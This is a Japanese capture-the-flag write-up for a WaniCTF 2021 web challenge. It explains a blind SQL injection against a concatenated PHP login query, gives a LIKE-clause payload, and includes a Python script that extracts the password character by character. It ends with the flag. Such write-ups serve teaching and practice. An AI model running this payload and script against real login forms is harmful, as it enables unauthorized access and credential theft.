# Writeup

ページにアクセスすると、サインイン画面が表示される。

入力したemailとpasswordで以下のクエリを実行する。

```php
$r = $db->query("SELECT * FROM users WHERE email = '" . $email . "' AND password = '" . $password . "'");
```

`AND password =`以降にLIKE句を挿入してblind SQL injectionを行い、パスワードを調べる。

例えば、`$email`を`wanictf21spring@gmail.com`,`$password`を`' OR password LIKE 'F%`とすると、

```sql
SELECT * FROM users WHERE email = 'wanictf21spring@gmail.com' AND password = '' OR password LIKE 'F%'
```

が実行され、ログインできればpasswordが`F`から始まることがわかる。

```py
import requests
import string

with requests.Session() as session:
    r = session.get("https://watch.web.wanictf.org/")
    chars = string.printable
    chars = chars.replace('%','')
    chars = chars.replace('_','')
    password = ""
    while True:
        for c in chars :
            data = {'email':'wanictf21spring@gmail.com', 'password': "' OR password LIKE '"+ password + c + "%"}
            r = session.post("https://watch.web.wanictf.org/",data=data)
            if "Login Failed..." not in r.text :
                break
        if c == chars[-1]:
            break
        password += c
        print(password)
```

<!-- FLAG{bl1ndSQLi} -->
